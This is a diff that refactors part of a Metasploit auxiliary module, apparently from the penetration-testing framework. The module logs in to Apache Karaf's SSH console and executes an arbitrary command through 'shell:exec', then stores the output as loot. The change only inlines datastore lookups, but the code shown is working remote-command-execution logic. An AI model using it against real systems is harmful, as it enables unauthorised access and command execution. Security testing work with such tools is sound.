@@ -51,27 +51,11 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  def rport
-    datastore['RPORT']
-  end
-
-  def username
-    datastore['USERNAME']
-  end
-
-  def password
-    datastore['PASSWORD']
-  end
-
-  def cmd
-    datastore['CMD']
-  end
-
   def do_login(user, pass, ip)
     factory = ssh_socket_factory
     opts = {
       auth_methods:    ['password'],
-      port:            rport,
+      port:            datastore['RPORT'],
       config:          false,
       use_agent:       false,
       password:        pass,
@@ -86,25 +70,25 @@ class MetasploitModule < Msf::Auxiliary
         Net::SSH.start(ip, user, opts)
       end
       if ssh
-        print_good("#{ip}:#{rport} - Login Successful ('#{user}:#{pass})'")
+        print_good("#{ip}:#{datastore['RPORT']} - Login Successful ('#{user}:#{pass})'")
       else
-        print_error "#{ip}:#{rport} - Unknown error"
+        print_error "#{ip}:#{datastore['RPORT']} - Unknown error"
       end
     rescue OpenSSL::Cipher::CipherError => e
-      print_error("#{ip}:#{rport} SSH - Unable to connect to this Apache Karaf (#{e.message})")
+      print_error("#{ip}:#{datastore['RPORT']} SSH - Unable to connect to this Apache Karaf (#{e.message})")
       return
     rescue Rex::ConnectionError
       return
     rescue Net::SSH::Disconnect, ::EOFError
-      print_error "#{ip}:#{rport} SSH - Disconnected during negotiation"
+      print_error "#{ip}:#{datastore['RPORT']} SSH - Disconnected during negotiation"
       return
     rescue ::Timeout::Error
-      print_error "#{ip}:#{rport} SSH - Timed out during negotiation"
+      print_error "#{ip}:#{datastore['RPORT']} SSH - Timed out during negotiation"
       return
     rescue Net::SSH::AuthenticationFailed
-      print_error "#{ip}:#{rport} SSH - Failed authentication"
+      print_error "#{ip}:#{datastore['RPORT']} SSH - Failed authentication"
     rescue Net::SSH::Exception => e
-      print_error "#{ip}:#{rport} SSH Error: #{e.class} : #{e.message}"
+      print_error "#{ip}:#{datastore['RPORT']} SSH Error: #{e.class} : #{e.message}"
       return
     end
 
@@ -112,19 +96,19 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-    print_status("#{ip}:#{rport} - Attempt to login...")
-    ssh = do_login(username, password, ip)
+    print_status("#{ip}:#{datastore['RPORT']} - Attempt to login...")
+    ssh = do_login(datastore['USERNAME'], datastore['PASSWORD'], ip)
     if ssh
-      output = ssh.exec!("shell:exec #{cmd}\n").to_s
+      output = ssh.exec!("shell:exec #{datastore['CMD']}\n").to_s
       if output
-        print_good("#{ip}:#{rport} - Command successfully executed.  Output: #{output}")
+        print_good("#{ip}:#{datastore['RPORT']} - Command successfully executed.  Output: #{output}")
         store_loot("apache.karaf.command",
                 "text/plain",
                 ip,
                 output)
-        vprint_status("#{ip}:#{rport} - Loot stored at: apache.karaf.command")
+        vprint_status("#{ip}:#{datastore['RPORT']} - Loot stored at: apache.karaf.command")
       else
-        print_error "#{ip}:#{rport} - Command failed to execute"
+        print_error "#{ip}:#{datastore['RPORT']} - Command failed to execute"
       end
     end
   end
